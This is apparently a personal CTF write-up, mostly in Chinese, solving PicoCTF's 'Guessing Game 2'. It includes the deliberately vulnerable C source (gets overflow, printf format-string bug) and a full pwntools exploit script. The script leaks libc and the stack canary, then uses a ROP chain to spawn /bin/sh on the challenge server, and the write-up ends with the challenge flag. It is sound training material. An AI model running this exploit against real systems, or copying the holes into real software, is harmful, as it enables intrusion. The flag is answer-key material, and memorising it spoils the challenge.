---
title: PicoCTF - Guessing Game 2
tags: [PicoCTF, CTF, PWN]

category: "Security > Practice > PicoCTF > PWN"
---

# PicoCTF - Guessing Game 2
## Background
fmt / leak libc / ret2libc / leak canary
## Source code
:::spoiler Source Code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 512


long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

// void print(long n)
// {
//     // If number is smaller than 0, put a - sign
//     // and change number to positive
//     if (n < 0) {
//         putchar('-');
//         n = -n;
//     }
 
//     // Remove the last digit and recur
//     if (n/10)
//         print(n/10);
 
//     // Print the last digit
//     putchar(n%10 + '0');
// }

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	// print(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);
	printf("Congrats: ");
	printf(winner);
	printf("\n\n");
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n");
	printf("Version: %x\n\n", get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```
:::
## Recon
寫這一題的時候切記不要隨便因為`Error /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found`的錯誤訊息而更新glibc，也就是下`sudo apt install libc6`這個command，經過實測是因為他給的elf執行檔有點問題，只要重新make就好，不然在用gdb trace code的時候，就會GG
```bash!
$ sudo apt install -y make
$ sudo apt-get install gcc -y
$ sudo apt-get install libc6-i386 -y
$ sudo apt-get install gcc-multilib -y
```
```bash!
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=69d83a7733e45de8e38431f09ee2cdb1b11b719e, for GNU/Linux 3.2.0, not stripped
$ checksec vuln
[*] '/mnt/d/NTU/CTF/PicoCTF/PWN/Guessing Game 2/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

1. **Brute Force Server Secret Number**
看了source code可以發現他和上一題幾乎一樣，上一題是要猜1-100的數字，而他會有固定的模式出現，所以可以直接用gdb跟他到底是哪些數字，但這一題的範圍明顯大很多(1-4096)，此時就要講到和上一題不一樣的地方，也就是第十行的==get_random== function中return的value是rand，他return的東西應該是一個固定的object而非經過運算的function(也就是==rand()==)，所以只要他沒有把靶機重開，運算的結果都會是一樣的，此時我們可以寫一個brute force script去try他用哪一個數字，以我的例子來說server的數字是`-3727`，而如果想知道local side的數字是多少，可以直接把原本的source code註解的部分拔掉，再make就會自己告訴你了
2. **Leak libc version**
接著就是開始try rop，可以看到61行有個明顯的bof，但我們應該先想辦法leak libc version，因為如果直接用vuln執行檔找ROP會少的可憐，所以要用libc，但是libc最後找的東西不見得會和他的版本一樣，這也是為甚麼不能更新glibc的原因，在stack中的相對位置不會一樣，會找的很痛苦而且做白工，leak libc的方法這邊是用fmt，雖然應該只有這個方法(在63行)，在print之前可以看一下stack的狀況，很明顯$esp+0x24c的地方出現`__libc_start_main`，利用[online database searching tool](https://libc.blukat.me/)可以知道server用甚麼版本
    ```bash
    0xffffc98c│+0x022c: 0x080495bb  →  <main+145> jmp 0x80495a8 <main+126>
    0xffffc990│+0x0230: 0x00000001
    0xffffc994│+0x0234: 0xffffca54  →  0xffffcc27
    0xffffc998│+0x0238: 0x000003e8
    0xffffc99c│+0x023c: 0x00000001
    0xffffc9a0│+0x0240: 0xffffc9c0  →  0x00000001
    0xffffc9a4│+0x0244: 0x00000000
    0xffffc9a8│+0x0248: 0x00000000
    0xffffc9ac│+0x024c: 0xf7deded5  →  <__libc_start_main+245> add esp, 0x10
    0xffffc9b0│+0x0250: 0xf7fbb000  →  0x001e7d6c
    0xffffc9b4│+0x0254: 0xf7fbb000  →  0x001e7d6c
    ```
    ![](https://hackmd.io/_uploads/SyZ2l94n3.png)
    而libc base address就是`0xf7d34fa1-0x018fa1=0xf7d1c000`
    :::info
    Note: 在x86版本中，fmt的顯示順序是從\$esp的地方開始，所以`__libc_start_main`就是在\$esp往後數==第147個位數==
    :::
3. **Change Execute Environment**
此時我們知道libc的版本是2.27，那就代表應該是18.04的版本，如果不想要費事裝VM或wsl就可以直接用@ccccc提供的腳本，讓這支程式跑在和server一樣的環境，==所以要把對應環境的loader和libc載下來==，用法如下:
    ```bash
    $ python {script path} {new env loader path} {original elf file}
    # e.g. python ./LD_PRELOAD.py ./ld-2.27.so ./vuln
    ```
    他會產生一個新的執行檔，名字是`V`，在pwntools寫的腳本也要改，用法如下
    ```python
    r = process('./V',env={"LD_PRELOAD" : "./libc-2.27.so"})
    ```
    此時我們跑的結果就換會和server端一樣
    ```python
    from pwn import *
    
    if args.REMOTE:
        r = remote("jupiter.challenges.picoctf.org", 18263)
        ans = -3727
    elif args.LOCAL:
        r = process("./V", env={"LD_PRELOAD" : "./libc-2.27.so"})
        # r = process('./vuln')
        # ans = -3615
        ans = -3727

    '''#############
    Find Libc address by stack info
    #############'''
    r.recvuntil(b'What number would you like to guess?\n')
    r.sendline(str(ans).encode())
    r.recvuntil(b'Name? ')
    r.sendline(b"%147$p")
    r.recvuntil(b"Congrats: 0x")
    __libc_start_main = int(r.recvuntil(b"\n").strip().decode(), 16)
    libc_addr = __libc_start_main - 0x018fa1
    libc_system_addr = libc_addr + 0x03cf10
    success(f"libc base address = {hex(libc_addr)}")
    success(f"libc system address = {hex(libc_system_addr)}")
    raw_input()
    ```
    ```bash
    $ python exp.py LOCAL
    [+] Starting local process './vuln': pid 9451
    [+] libc base address = 0xf7dce000
    [+] libc system address = 0xf7e0af10
    $ python exp.py REMOTE
    [+] Opening connection to jupiter.challenges.picoctf.org on port 18263: Done
    [+] libc base address = 0xf7d99000
    [+] libc system address = 0xf7dd5f10
    ```
4. **找canary**
這一題因為有開canary又要觸發rop所以勢必會蓋到，可以先把相對位置記起來，也就是$esp+0x021c
    ```bash
    0xffffc978│+0x0218: 0xf7e22d39  →  <printf+9> add eax, 0x1982c7
    0xffffc97c│+0x021c: 0x0c458f00
    0xffffc980│+0x0220: 0x0804a0c4  →  "Version: %x\n\n"
    0xffffc984│+0x0224: 0x0804bfb8  →  0x0804bec0
    0xffffc988│+0x0228: 0xffffc9a8  →  0x00000000    ← $ebp
    ```
    ```bash
    $ python exp.py LOCAL
    [+] Starting local process './V': pid 11379
    [+] libc base address = 0xf7d2f000
    [+] libc system address = 0xf7d6bf10

    [+] Canary Value = 0xd824d100
    ```
5. **寫/bin/sh\x00並開shell**
要開shell的話必須要找個地方寫`/bin/sh\x00`，但是我有想過要用system read的方式，但是找不到int 0x80 ; ret的gadget所以就直接寫在stack上最快也最方便，只是要計算執行到開shell之前的esp或ebp，所以我們可以直接沿用fmt的技巧先把ebp的address紀錄起來等到把/bin/sh寫上去之後再看offset是多少，以我的例子來說就是差了0x8的距離，可以直接用gdb跟一下就知道了
    ```python
    r.recvuntil(b'What number would you like to guess?\n')
    r.sendline(str(ans).encode())
    r.recvuntil(b'Name? ')
    r.sendline(b"%138$p")
    r.recvuntil(b"Congrats: ")
    ebp_addr = int(r.recvuntil(b"\n").strip().decode(), 16)
    success(f"ebp address = {hex(ebp_addr)}")
    # raw_input()

    bin_sh_1 = 0x6e69622f
    bin_sh_2 = 0x68732f
    pop_eax_ret = 0x00024d37 + libc_addr
    pop_ebx_ret = 0x00018d05 + libc_addr
    pop_ecx_ret = 0x00193aa4 + libc_addr
    pop_edx_ret = 0x00001aae + libc_addr
    int_0x80 = 0x00002d3f + libc_addr

    ROP_payload = flat(
        pop_eax_ret, 0xb,
        pop_ebx_ret, (ebp_addr+0x8),
        pop_ecx_ret, 0,
        pop_edx_ret, 0,
        int_0x80,
        bin_sh_1, bin_sh_2
    )
    r.recvuntil(b'What number would you like to guess?\n')
    r.sendline(str(ans).encode())
    r.recvuntil(b'Name? ')
    r.sendline(b'a' * (0x200) + p32(canary_value) + b'a' * 0xc + ROP_payload)
    ```
## Exploit - ROP gadget / leak libc / leak Canary
這一題算是綜合蠻多stack vulnerability的技巧，所以過程蠻複雜的，但只要環境對了就很順利
```python=
from pwn import *
import random


if args.REMOTE:
    r = remote("jupiter.challenges.picoctf.org", 18263)
    ans = -3727
elif args.LOCAL:
    r = process("./V", env={"LD_PRELOAD" : "./libc-2.27.so"})
    # r = process('./vuln')
    # ans = -3615
    ans = -3727

'''#############
Find Libc address by stack info
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b"%147$p")
r.recvuntil(b"Congrats: 0x")
__libc_start_main = int(r.recvuntil(b"\n").strip().decode(), 16)
libc_addr = __libc_start_main - 0x018fa1
libc_system_addr = libc_addr + 0x03cf10
success(f"libc base address = {hex(libc_addr)}")
success(f"libc system address = {hex(libc_system_addr)}")
# raw_input()

'''#############
Find Canary Value
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b"%135$p")
r.recvuntil(b"Congrats: 0x")
canary_value = int(r.recvuntil(b"\n").strip().decode(), 16)
success(f"Canary Value = {hex(canary_value)}")
# raw_input()

'''#############
Get Shell
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b"%138$p")
r.recvuntil(b"Congrats: ")
ebp_addr = int(r.recvuntil(b"\n").strip().decode(), 16)
success(f"ebp address = {hex(ebp_addr)}")
# raw_input()

bin_sh_1 = 0x6e69622f
bin_sh_2 = 0x68732f
pop_eax_ret = 0x00024d37 + libc_addr
pop_ebx_ret = 0x00018d05 + libc_addr
pop_ecx_ret = 0x00193aa4 + libc_addr
pop_edx_ret = 0x00001aae + libc_addr
int_0x80 = 0x00002d3f + libc_addr

ROP_payload = flat(
    pop_eax_ret, 0xb,
    pop_ebx_ret, (ebp_addr+0x8),
    pop_ecx_ret, 0,
    pop_edx_ret, 0,
    int_0x80,
    bin_sh_1, bin_sh_2
)
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
r.sendline(b'a' * (0x200) + p32(canary_value) + b'a' * 0xc + ROP_payload)
# raw_input()
r.interactive()
```

Flag: `picoCTF{p0p_r0p_4nd_dr0p_1t_73d8dcc827619318}`
## Reference
[PicoCTF — Guessing Game 2 Walkthrough | ret2libc, stack cookies](https://captain-woof.medium.com/picoctf-guessing-game-2-walkthrough-ret2libc-stack-cookies-6f9fc39273bf)